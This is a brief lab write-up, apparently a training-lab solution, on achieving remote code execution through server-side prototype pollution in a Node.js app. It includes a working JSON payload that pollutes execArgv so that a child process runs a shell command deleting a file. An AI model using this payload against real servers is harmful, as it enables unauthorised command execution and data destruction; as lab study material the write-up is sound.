# Remote code execution via server-side prototype pollution
I noticed there was a `Run maintainance jobs` button on the admin panel.
I then polluted JSON spaces to see if there was plain prototype pollution - and there was. Then I tried polluting `execArgv` like this:
```json
"__proto__" :{
    "execArgv" : [
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```
And it solved the lab.